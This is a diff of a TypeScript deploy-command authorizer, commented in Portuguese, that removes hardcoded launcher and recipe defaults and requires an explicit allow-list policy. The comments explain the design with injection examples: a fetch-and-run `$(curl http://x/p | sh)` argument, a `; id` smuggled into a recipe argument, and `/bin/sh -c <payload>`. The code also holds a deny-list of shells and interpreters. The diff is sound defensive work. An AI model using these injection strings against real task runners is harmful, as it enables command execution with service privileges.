@@ -25,9 +25,16 @@
 // superfície de revisão.
 //
 // O QUE ELE NÃO FAZ: reduzir autonomia. Não há aprovação humana em lugar nenhum, o self-deploy segue
-// automático, e o dono que publica com outro lançador/receita ESTENDE as allow-lists pelo env do SERVIÇO
-// (systemd) — canal que board-data não alcança. O que board-data perde é só o poder de ESCOLHER qualquer
-// programa/receita.
+// automático, e o dono que publica com outro lançador/receita DECLARA as allow-lists no `storymap/settings.yaml` do
+// alvo (`deploy.launchers` / `deploy.recipeRunners` / `deploy.recipes`) ou no env do SERVIÇO (systemd) — canais que
+// board-data não alcança. O que board-data perde é só o poder de ESCOLHER qualquer programa/receita.
+//
+// SEM DEFAULT NO CÓDIGO (lote D): as três listas nasceram com o ferramental do repositório onde a ferramenta foi
+// escrita (um task runner, dois CLIs de publicação, o nome de uma receita). Isso era uma suposição escondida — num
+// alvo que publica de outro jeito, o comando dele seria recusado por uma lista que ele nunca viu, ou, pior, um
+// lançador que ele não usa ficaria autorizado. Agora o padrão é VAZIO e a política é SEMPRE passada de fora
+// ({@link DeployCommandPolicy}, obrigatória: um chamador novo que a esqueça não compila). Vazio recusa dizendo a chave a
+// declarar, nunca supõe.
 
 /** POSIX single-quote a string para embutir como UM argumento de shell — o shell externo nunca expande o
  *  `$VAR`/`$(…)` de dentro. Escapa a aspa simples pelo idioma '\''. */
@@ -98,73 +105,61 @@ export function parseDeclaredArgv(cmd: string): string[] | null {
   return argv.length > 0 ? argv : null;
 }
 
-/**
+/*
  * A ALLOW-LIST dos LANÇADORES de deploy: os únicos programas que uma declaração de board-data pode pôr
- * em `argv[0]`.
+ * em `argv[0]`. Ela vem do alvo (`settings.yaml` → `deploy.launchers`, mais o env do serviço) e NÃO tem default.
  *
  * POR QUE ALLOW-LIST, e não uma régua de caracteres nem uma lista de proibidos: a 1ª passada olhava
  * METACARACTERE fora de aspas, e isso não impedia nada — o atacante não precisa de `;`/`|`, basta declarar
  * um INTERPRETADOR como alvo e pôr o payload dentro de aspas (`bash -c '…'`, `sh -c`, `node -e`,
  * `python3 -c`, `env FOO=1 bash …`, `/bin/sh -c`). Enumerar interpretadores seria uma lista infinita (todo
  * shell, todo runtime, todo wrapper de exec: `env`, `xargs`, `nice`, `find -exec`…), então a régua é
- * invertida: só o que está NOMEADO aqui é executável, e todo o resto é recusado com motivo.
+ * invertida: só o que está NOMEADO na política é executável, e todo o resto é recusado com motivo.
  *
- * O conjunto é o que o deploy REALMENTE usa: `just` (task runner do repo — a receita padrão ({@link DEPLOY_RECIPES}) é o
- * único `deployCmd` declarado hoje) e os dois CLIs de publicação que o `_base/board.yaml` documenta como
- * exemplo de `kind: command` (`vercel deploy --prod`, `flyctl deploy`). Nenhuma capacidade do dono é
- * tirada: quem publica com outro CLI estende a lista pelo env do SERVIÇO ({@link resolveDeployLaunchers}).
+ * Nenhuma capacidade do dono é tirada: quem publica com outro CLI o declara. O que muda é QUEM sabe qual CLI é
+ * esse — o alvo, não o código da ferramenta.
  */
-const DEPLOY_LAUNCHERS: readonly string[] = ["just", "vercel", "flyctl"];
 
-/**
- * Lançadores cuja RECEITA mora num arquivo (o `justfile` da raiz do repo, versionado e sob gate de código)
- * e que a EXPANDEM COMO TEXTO dentro de uma linha de shell. São a razão de existirem as réguas de
- * {@link DEPLOY_RECIPES} e {@link RECIPE_ARG_WORD}: num task runner o argumento não termina em `argv` —
+/*
+ * Lançadores cuja RECEITA mora num arquivo (o arquivo de tarefas da raiz do repo, versionado e sob gate de
+ * código) e que a EXPANDEM COMO TEXTO dentro de uma linha de shell. São a razão de existirem as réguas de
+ * receitas e {@link RECIPE_ARG_WORD}: num task runner o argumento não termina em `argv` —
  * ele é INTERPOLADO na receita e o shell do runner lê o resultado.
  *
- * Para eles NENHUM argumento pode começar por `-`: `--justfile`/`-f`/`--working-directory` apontariam a
+ * Para eles NENHUM argumento pode começar por `-`: opções de arquivo/diretório de trabalho apontariam a
  * receita para FORA do repositório, devolvendo ao dado declarado o poder de escolher o que roda. Receita e
  * parâmetro são posicionais, então a régua não custa capacidade nenhuma.
  *
- * ⚠ LIMITE DECLARADO (3ª passada): este default é só `just` porque é o único task runner que este
- * repositório usa — mas o knob do operador ({@link resolveDeployLaunchers}) aceita QUALQUER nome, e um task
- * runner adicionado por lá (`task`, `mise`, `rake`, `mask`…) NÃO herda a régua da cadeia por adivinhação:
- * ele interpola parâmetro em shell igual ao `just` e receberia apenas a régua de lançador. Quem adiciona um
- * task runner tem de declará-lo TAMBÉM em `AGILEHARNESS_DEPLOY_RECIPE_RUNNERS`
- * ({@link resolveRecipeRunners}) — mesmo canal do operador, e está DITO aqui em vez de fingido. O default
- * não inclui task runners de fábrica de propósito: um lançador comum (`pulumi up --yes`) morreria na régua
- * de opção sem knob nenhum para sair do beco.
+ * ⚠ LIMITE DECLARADO: um lançador só responde à régua da cadeia receita→argumento se o operador o declarar em
+ * `deploy.recipeRunners` (ou `AGILEHARNESS_DEPLOY_RECIPE_RUNNERS`). A ferramenta NÃO adivinha qual lançador é task
+ * runner: um lançador comum (`pulumi up --yes`) morreria na régua de opção sem knob nenhum para sair do beco.
  */
-const RECIPE_RUNNERS: readonly string[] = ["just"];
 
-/**
+/*
  * A allow-list das RECEITAS de deploy: o alvo SECUNDÁRIO, que num task runner é quem escolhe QUAL linha de
- * shell vai receber os argumentos.
+ * shell vai receber os argumentos. Vem de `deploy.recipes` (mais o env) e NÃO tem default.
  *
  * O que isto IMPEDE: que um lançador autorizado seja usado como PORTA para uma receita que interpola
- * argumento em comando de shell. Medido com `just --dry-run`: `just` NÃO passa parâmetro como argv — ele o
+ * argumento em comando de shell. Medido com um task runner de receitas: ele NÃO passa parâmetro como argv — ele o
  * cola COMO TEXTO na linha da receita, que então vai para um shell. Uma receita `ping-url url:` cujo corpo é
- * `node tools/ping.js --url {{url}}` mostra a cadeia inteira: `just ping-url '$(curl http://x/p | sh)'` vira
+ * `node tools/ping.js --url {{url}}` mostra a cadeia inteira: `<runner> ping-url '$(curl http://x/p | sh)'` vira
  * `node tools/ping.js --url $(curl http://x/p | sh)`, e uma receita `archive id board:` com corpo
- * `bun tools/archive.ts {{id}} {{board}}` transforma `just archive 'a; id' loja` em `bun tools/archive.ts a; id loja`.
+ * `bun tools/archive.ts {{id}} {{board}}` transforma `<runner> archive 'a; id' loja` em `bun tools/archive.ts a; id loja`.
  * Alvo autorizado, payload no ARGUMENTO, execução com o privilégio do serviço a partir de uma linha de board-data
  * que não passa por gate de código.
  *
  * POR QUE ALLOW-LIST da receita, e não só saneamento de argumento: são réguas ORTOGONAIS e ambas
  * necessárias. O saneamento ({@link RECIPE_ARG_WORD}) protege a receita que HOJE interpola; a allow-list
- * protege da receita que amanhã VAI interpolar — o `justfile` cresce sem passar por este arquivo, e as receitas
+ * protege da receita que amanhã VAI interpolar — o arquivo de tarefas cresce sem passar por este arquivo, e as receitas
  * parametrizadas de um repositório raramente foram escritas pensando em receber dado hostil. Fixar o conjunto
  * ALCANÇÁVEL é o que fecha por DESENHO em vez de por acidente.
  *
- * O conjunto é o que o deploy REALMENTE usa: a receita padrão abaixo é a única declarada em board-data
- * (`deploy.surfaces[].deployCmd`). Quem publica com outra receita a NOMEIA no env do SERVIÇO ({@link resolveDeployRecipes}). E não há lista de receitas PROIBIDAS
- * porque não é preciso: a receita mora no `justfile` versionado, que é superfície de revisão; o que
- * board-data perde é o poder de ESCOLHER qual delas roda.
+ * E não há lista de receitas PROIBIDAS porque não é preciso: a receita mora num arquivo versionado, que é
+ * superfície de revisão; o que board-data perde é o poder de ESCOLHER qual delas roda.
  */
-const DEPLOY_RECIPES: readonly string[] = ["sync-web-terminal"];
 
 /**
- * A FORMA de um argumento que vai para um {@link RECIPE_RUNNERS}: uma PALAVRA literal, validada por
+ * A FORMA de um argumento que vai para um task runner ({@link DeployCommandPolicy.recipeRunners}): uma PALAVRA literal, validada por
  * allow-list de caracteres.
  *
  * O que isto IMPEDE: que o argumento vire SINTAXE na linha de shell da receita. Como o task runner
@@ -199,14 +194,14 @@ const RECIPE_ARG_WORD = /^[A-Za-z0-9][A-Za-z0-9._:,=+@/-]*$/;
  */
 const RECIPE_NAME_SHAPE = /^[A-Za-z_][A-Za-z0-9_-]*$/;
 
-/** Env do SERVIÇO (systemd) pelo qual o operador estende {@link DEPLOY_LAUNCHERS}. Nomes separados por espaço/vírgula. */
+/** Env do SERVIÇO (systemd) pelo qual o operador ESTENDE `deploy.launchers`. Nomes separados por espaço/vírgula. */
 const DEPLOY_LAUNCHERS_ENV = "AGILEHARNESS_DEPLOY_LAUNCHERS";
 
-/** Env do SERVIÇO pelo qual o operador estende {@link DEPLOY_RECIPES}. Nomes separados por espaço/vírgula. */
+/** Env do SERVIÇO pelo qual o operador ESTENDE `deploy.recipes`. Nomes separados por espaço/vírgula. */
 const DEPLOY_RECIPES_ENV = "AGILEHARNESS_DEPLOY_RECIPES";
 
-/** Env do SERVIÇO pelo qual o operador declara que um lançador que ele adicionou É um task runner (e
- *  portanto responde à cadeia receita→argumento). Ver o ⚠ de {@link RECIPE_RUNNERS}. */
+/** Env do SERVIÇO pelo qual o operador ESTENDE `deploy.recipeRunners`: declara que um lançador É um task runner (e
+ *  portanto responde à cadeia receita→argumento). */
 const RECIPE_RUNNERS_ENV = "AGILEHARNESS_DEPLOY_RECIPE_RUNNERS";
 
 /**
@@ -214,7 +209,7 @@ const RECIPE_RUNNERS_ENV = "AGILEHARNESS_DEPLOY_RECIPE_RUNNERS";
  * board-data; esta lista impede que o KNOB reabra o buraco por engano — um `AGILEHARNESS_DEPLOY_LAUNCHERS=bash`
  * transformaria a régua em decoração. Ela NÃO é a régua (lista de proibidos nunca é): é a trava do knob.
  */
-const NEVER_A_DEPLOY_TARGET: ReadonlySet<string> = new Set([
+export const NEVER_A_DEPLOY_TARGET: ReadonlySet<string> = new Set([
   // shells
   "bash", "sh", "dash", "zsh", "ksh", "fish", "csh", "tcsh", "busybox",
   // runtimes que executam código vindo de argumento (`-e`/`-c`)
@@ -227,6 +222,21 @@ const NEVER_A_DEPLOY_TARGET: ReadonlySet<string> = new Set([
   "awk", "gawk", "sed", "find", "eval", "exec", "command", "source", "make",
 ]);
 
+/**
+ * Os task runners CONHECIDOS — só para o LINT de {@link taskRunnersMissingFromRecipeRunners}. NÃO é allow-list nem default: a
+ * ferramenta continua sem supor qual lançador o alvo usa (a lista de lançadores é só a que o operador declara). Serve a UM
+ * aviso: um lançador declarado que é task runner e NÃO está em `recipeRunners` recebe a régua de lançador comum e perde a
+ * da cadeia receita→argumento — o que dá a um dado de board (editável por agente) a interpolação de texto numa linha de
+ * shell do runner, com o privilégio do serviço. É um erro fácil (declarar `launchers` e esquecer `recipeRunners`) e
+ * silencioso, por isso vira aviso alto, não suposição.
+ */
+export const KNOWN_TASK_RUNNERS: ReadonlySet<string> = new Set(["just", "task", "mise", "rake", "mask"]);
+
+/** Os lançadores efetivos que são task runners CONHECIDOS e não respondem à régua da cadeia (fora de `recipeRunners`). PURA. */
+export function taskRunnersMissingFromRecipeRunners(policy: Pick<DeployCommandPolicy, "launchers" | "recipeRunners">): string[] {
+  return policy.launchers.filter((l) => KNOWN_TASK_RUNNERS.has(l) && !policy.recipeRunners.has(l));
+}
+
 /** Os nomes declarados num knob de env: separados por espaço/vírgula, vazios descartados. PURA. */
 function envNames(raw: string | undefined): string[] {
   return (raw ?? "")
@@ -235,43 +245,92 @@ function envNames(raw: string | undefined): string[] {
     .filter((s) => s.length > 0);
 }
 
-/**
- * PURA sobre o env recebido: a allow-list efetiva = os defaults MAIS o que o operador declarou em
- * `AGILEHARNESS_DEPLOY_LAUNCHERS`. Os defaults nunca são substituídos (só estendidos), um nome com `/`
- * é ignorado (alvo é NOME, não caminho) e um {@link NEVER_A_DEPLOY_TARGET} é ignorado mesmo vindo do env.
- *
- * ⚠ Se o lançador adicionado for um TASK RUNNER, declare-o também em `AGILEHARNESS_DEPLOY_RECIPE_RUNNERS`
- * — senão ele recebe a régua de lançador e NÃO a da cadeia receita→argumento (ver {@link RECIPE_RUNNERS}).
- */
-export function resolveDeployLaunchers(env: Record<string, string | undefined> = process.env): readonly string[] {
-  const extra = envNames(env[DEPLOY_LAUNCHERS_ENV]).filter((s) => !s.includes("/") && !NEVER_A_DEPLOY_TARGET.has(s));
-  return extra.length > 0 ? [...DEPLOY_LAUNCHERS, ...extra] : DEPLOY_LAUNCHERS;
+/** Une as três fontes de uma lista de nomes — o que o `settings.yaml` do alvo declarou ∪ o env do serviço —, sem repetição. */
+function unionNames(declared: readonly string[] | undefined, fromEnv: readonly string[]): string[] {
+  return [...new Set([...(declared ?? []), ...fromEnv])];
 }
 
 /**
- * PURA sobre o env recebido: as receitas alcançáveis = os defaults MAIS o que o operador declarou em
- * `AGILEHARNESS_DEPLOY_RECIPES`. Mesma disciplina de {@link resolveDeployLaunchers}: os defaults nunca são
- * substituídos (só estendidos) e um nome que não tem a FORMA de nome de receita ({@link RECIPE_NAME_SHAPE})
+ * PURA sobre o env recebido: a allow-list efetiva de lançadores = o que o alvo declarou (`deploy.launchers`,
+ * `declared`) ∪ o que o operador pôs em `AGILEHARNESS_DEPLOY_LAUNCHERS`. NÃO HÁ DEFAULT: sem declaração nenhuma a lista é
+ * VAZIA e a régua recusa tudo dizendo a chave a declarar. O env só ACRESCENTA (nunca remove o que o settings declarou);
+ * um nome com `/` é ignorado (alvo é NOME, não caminho) e um {@link NEVER_A_DEPLOY_TARGET} é ignorado venha de onde vier —
+ * inclusive do settings, porque um `launchers: [bash]` por engano reabriria o buraco que a allow-list fecha.
+ *
+ * ⚠ Se o lançador adicionado for um TASK RUNNER, declare-o também em `deploy.recipeRunners`
+ * — senão ele recebe a régua de lançador e NÃO a da cadeia receita→argumento.
+ */
+export function resolveDeployLaunchers(
+  env: Record<string, string | undefined> = process.env,
+  declared?: readonly string[],
+): readonly string[] {
+  return unionNames(declared, envNames(env[DEPLOY_LAUNCHERS_ENV])).filter((s) => !s.includes("/") && !NEVER_A_DEPLOY_TARGET.has(s));
+}
+
+/**
+ * PURA sobre o env recebido: as receitas alcançáveis = `deploy.recipes` (`declared`) ∪ `AGILEHARNESS_DEPLOY_RECIPES`. Sem
+ * default. Um nome que não tem a FORMA de nome de receita ({@link RECIPE_NAME_SHAPE})
  * é ignorado — o task runner não conseguiria resolvê-lo de qualquer forma, e aceitá-lo aqui só daria ao knob
  * a aparência de liberar algo. (A régua anterior usava a forma de ARGUMENTO, mais larga: ela aceitava
  * `a/b`, `a.b` e `k=v` como "receita" enquanto o doc-comment afirmava que `/`, espaço e `$` eram ignorados.)
  *
  * O que o operador declara aqui são NOMES ALCANÇÁVEIS EM POSIÇÃO DE RECEITA — e como o task runner reparte
- * argumentos por aridade, um PARÂMETRO em forma de palavra-nome (`prod`, `storymap`) também precisa estar
- * nesta lista. Não é preciosismo: é a única leitura sound sem parsear o justfile.
+ * argumentos por aridade, um PARÂMETRO em forma de palavra-nome (`prod`, `loja`) também precisa estar
+ * nesta lista. Não é preciosismo: é a única leitura sound sem parsear o arquivo de receitas.
  */
-export function resolveDeployRecipes(env: Record<string, string | undefined> = process.env): readonly string[] {
-  const extra = envNames(env[DEPLOY_RECIPES_ENV]).filter((s) => RECIPE_NAME_SHAPE.test(s));
-  return extra.length > 0 ? [...DEPLOY_RECIPES, ...extra] : DEPLOY_RECIPES;
+export function resolveDeployRecipes(
+  env: Record<string, string | undefined> = process.env,
+  declared?: readonly string[],
+): readonly string[] {
+  return unionNames(declared, envNames(env[DEPLOY_RECIPES_ENV])).filter((s) => RECIPE_NAME_SHAPE.test(s));
 }
 
 /**
- * PURA sobre o env recebido: os lançadores que respondem à cadeia receita→argumento = `just` MAIS o que o
- * operador declarou em `AGILEHARNESS_DEPLOY_RECIPE_RUNNERS`. Um nome que não é lançador é inócuo (a régua
+ * PURA sobre o env recebido: os lançadores que respondem à cadeia receita→argumento = `deploy.recipeRunners`
+ * (`declared`) ∪ `AGILEHARNESS_DEPLOY_RECIPE_RUNNERS`. Sem default. Um nome que não é lançador é inócuo (a régua
  * da cadeia só é consultada depois de o alvo passar pela allow-list de lançadores).
  */
-export function resolveRecipeRunners(env: Record<string, string | undefined> = process.env): ReadonlySet<string> {
-  return new Set([...RECIPE_RUNNERS, ...envNames(env[RECIPE_RUNNERS_ENV]).filter((s) => RECIPE_NAME_SHAPE.test(s))]);
+export function resolveRecipeRunners(
+  env: Record<string, string | undefined> = process.env,
+  declared?: readonly string[],
+): ReadonlySet<string> {
+  return new Set(unionNames(declared, envNames(env[RECIPE_RUNNERS_ENV])).filter((s) => RECIPE_NAME_SHAPE.test(s)));
+}
+
+/**
+ * A POLÍTICA do passo privilegiado: o que um comando declarado em board-data pode EXECUTAR. Ela é OBRIGATÓRIA em
+ * {@link authorizeDeployCommand} (sem default no código — ver o cabeçalho) e se monta com {@link deployPolicyFromSettings}.
+ */
+export interface DeployCommandPolicy {
+  /** os programas que podem ficar em `argv[0]` */
+  launchers: readonly string[];
+  /** as receitas alcançáveis em posição de receita, num task runner */
+  recipes: readonly string[];
+  /** os lançadores que são task runners (respondem à cadeia receita→argumento) */
+  recipeRunners: ReadonlySet<string>;
+}
+
+/** O que a política lê do bloco `deploy:` do settings (estrutural: este módulo não importa tipos nenhum). */
+export interface DeployCommandPolicySource {
+  launchers?: readonly string[];
+  recipes?: readonly string[];
+  recipeRunners?: readonly string[];
+}
+
+/**
+ * PURA: monta a política efetiva = `settings.yaml → deploy.{launchers,recipes,recipeRunners}` ∪ o env do serviço. O `declared` é o
+ * bloco `deploy` já peneirado pelo carregador de config (ou a política resolvida dele); ausente ⇒ só o env ⇒, num
+ * serviço sem env, TUDO VAZIO (nenhum comando de board-data roda no passo privilegiado).
+ */
+export function deployPolicyFromSettings(
+  declared: DeployCommandPolicySource | null | undefined,
+  env: Record<string, string | undefined> = process.env,
+): DeployCommandPolicy {
+  return {
+    launchers: resolveDeployLaunchers(env, declared?.launchers),
+    recipes: resolveDeployRecipes(env, declared?.recipes),
+    recipeRunners: resolveRecipeRunners(env, declared?.recipeRunners),
+  };
 }
 
 /** Veredito da régua: a argv AUTORIZADA, ou o motivo NOMEADO da recusa (nunca os dois). */
@@ -307,21 +366,19 @@ const hasControlChar = (word: string): boolean =>
  *  2. argumento com caractere de controle — some com o rastro de auditoria e não existe em deploy real;
  *  3. alvo com `/` — alvo é NOME resolvido pelo PATH do operador, nunca um arquivo que o dado escolheu
  *     (é o que impede `'/bin/sh' '-c' '<payload>'`, que passa pelo parser inteiro);
- *  4. alvo fora da {@link DEPLOY_LAUNCHERS} — aqui morrem TODOS os interpretadores, sem enumerá-los;
- *  5. opção num {@link RECIPE_RUNNERS} — `--justfile` apontaria a receita para fora do repositório;
+ *  4. alvo fora de `policy.launchers` — aqui morrem TODOS os interpretadores, sem enumerá-los (e, sem política
+ *     declarada, TODO comando: a recusa diz a chave a declarar);
+ *  5. opção num task runner (`policy.recipeRunners`) — uma opção de arquivo de receitas apontaria a receita para fora do repositório;
  *  6. num task runner, QUALQUER posição que possa ser receita ({@link RECIPE_NAME_SHAPE}) fora da
- *     {@link DEPLOY_RECIPES} — `just` roda várias receitas por invocação e reparte argumentos por aridade,
+ *     `policy.recipes` — um task runner roda várias receitas por invocação e reparte argumentos por aridade,
  *     que o harness não conhece; validar só `argv[1]` deixava o `justfile` inteiro alcançável;
  *  7. argumento de task runner que não é PALAVRA ({@link RECIPE_ARG_WORD}) — o runner o interpola SEM citar,
  *     então `;`/`|`/`$(…)`/`` ` ``/`>` ali são sintaxe executada como root, mesmo tendo vindo dentro de aspas.
  * Passando as sete, as palavras viram argumentos POSICIONAIS de um script fixo (`exec "$@"`) ou uma argv
  * re-citada ({@link quoteArgv}): shell nenhum as re-interpreta.
  */
-export function authorizeDeployCommand(
-  cmd: string,
-  opts?: { launchers?: readonly string[]; recipes?: readonly string[]; recipeRunners?: ReadonlySet<string> },
-): DeployCommandVerdict {
-  const launchers = opts?.launchers ?? resolveDeployLaunchers();
+export function authorizeDeployCommand(cmd: string, policy: DeployCommandPolicy): DeployCommandVerdict {
+  const launchers = policy.launchers;
   const argv = parseDeclaredArgv(cmd);
   if (!argv) {
     return {
@@ -341,19 +398,19 @@ export function authorizeDeployCommand(
       argv: null,
       refusal:
         `alvo com caminho (${target}) — o alvo tem de ser o NOME de um lançador da allow-list ` +
-        `(${launchers.join(", ")}), nunca um arquivo escolhido pelo dado declarado`,
+        `(${launchers.join(", ") || "nenhum declarado"}), nunca um arquivo escolhido pelo dado declarado`,
     };
   }
   if (!launchers.includes(target)) {
     return {
       argv: null,
       refusal:
-        `alvo ${target} fora da allow-list de lançadores de deploy (${launchers.join(", ")}) — interpretador ` +
-        `(bash, sh, node, python, env, xargs) NUNCA é alvo válido. Declare uma receita versionada do ` +
-        `repositório (just <alvo>), use kind: agent, ou estenda a allow-list pelo env ${DEPLOY_LAUNCHERS_ENV} do serviço`,
+        `alvo ${target} fora da allow-list de lançadores de deploy (${launchers.join(", ") || "nenhum declarado"}) — ` +
+        `interpretador (bash, sh, node, python, env, xargs) NUNCA é alvo válido. Declare o lançador do repositório em ` +
+        `settings.yaml → deploy.launchers (ou no env ${DEPLOY_LAUNCHERS_ENV} do serviço), ou use kind: agent`,
     };
   }
-  const recipeRunners = opts?.recipeRunners ?? resolveRecipeRunners();
+  const recipeRunners = policy.recipeRunners;
   if (recipeRunners.has(target)) {
     const option = args.find((a) => a.startsWith("-"));
     if (option) {
@@ -364,13 +421,15 @@ export function authorizeDeployCommand(
           `(--justfile, -f e --working-directory apontariam a receita para fora do repositório)`,
       };
     }
-    const recipes = opts?.recipes ?? resolveDeployRecipes();
+    const recipes = policy.recipes;
+    const recipesTxt = recipes.join(", ") || "nenhuma declarada";
+    const declareRecipe = `Declare a receita em settings.yaml → deploy.recipes (ou no env ${DEPLOY_RECIPES_ENV} do serviço)`;
     if (args.length === 0) {
       return {
         argv: null,
         refusal:
-          `${target} sem receita — o task runner sozinho roda a receita DEFAULT do justfile, que não é um ` +
-          `passo de publicação declarado. Nomeie a receita (${recipes.join(", ")})`,
+          `${target} sem receita — o task runner sozinho roda a receita DEFAULT do arquivo de receitas, que não é um ` +
+          `passo de publicação declarado. Nomeie a receita (${recipesTxt})`,
       };
     }
     // A CADEIA INTEIRA, POSIÇÃO POR POSIÇÃO — não só `argv[1]`. A primeira posição É uma receita por
@@ -389,9 +448,9 @@ export function authorizeDeployCommand(
         return {
           argv: null,
           refusal:
-            `receita ${arg} fora da allow-list de receitas de deploy (${recipes.join(", ")}) — no ${target} a ` +
+            `receita ${arg} fora da allow-list de receitas de deploy (${recipesTxt}) — no ${target} a ` +
             `posição da receita não aceita nem parâmetro nem ATRIBUIÇÃO (VAR=…, que reescreveria a própria ` +
-            `linha da receita). Declare a receita no env ${DEPLOY_RECIPES_ENV} do serviço`,
+            `linha da receita). ${declareRecipe}`,
         };
       }
       if (looksLikeRecipe && !recipes.includes(arg)) {
@@ -399,16 +458,15 @@ export function authorizeDeployCommand(
           argv: null,
           refusal:
             i === 0
-              ? `receita ${arg} fora da allow-list de receitas de deploy (${recipes.join(", ")}) — o ${target} ` +
+              ? `receita ${arg} fora da allow-list de receitas de deploy (${recipesTxt}) — o ${target} ` +
                 `interpola parâmetro COMO TEXTO na linha de shell da receita, então uma receita parametrizada ` +
-                `qualquer (canary-check, advance-card, api-extract…) executa o argumento como root. Declare a ` +
-                `receita no env ${DEPLOY_RECIPES_ENV} do serviço`
-              : `receita ${arg} fora da allow-list de receitas de deploy (${recipes.join(", ")}): a palavra na ` +
+                `qualquer (canary-check, advance-card, api-extract…) executa o argumento como root. ${declareRecipe}`
+              : `receita ${arg} fora da allow-list de receitas de deploy (${recipesTxt}): a palavra na ` +
                 `posição ${i + 1} tem forma de NOME DE RECEITA, e o ${target} roda VÁRIAS receitas por invocação, ` +
-                `repartindo os argumentos pela aridade de cada uma — aridade que só o justfile conhece. Nesta ` +
+                `repartindo os argumentos pela aridade de cada uma — aridade que só o arquivo de receitas conhece. Nesta ` +
                 `posição a palavra pode ser uma SEGUNDA receita (e a primeira, real, tem aridade 0), então o ` +
-                `justfile inteiro ficaria alcançável de board-data. Declare-a no env ${DEPLOY_RECIPES_ENV} do ` +
-                `serviço, ou passe um parâmetro sem forma de nome de receita (URL, caminho, chave=valor)`,
+                `arquivo de receitas inteiro ficaria alcançável de board-data. ${declareRecipe}, ` +
+                `ou passe um parâmetro sem forma de nome de receita (URL, caminho, chave=valor)`,
         };
       }
       if (!looksLikeRecipe && !RECIPE_ARG_WORD.test(arg)) {
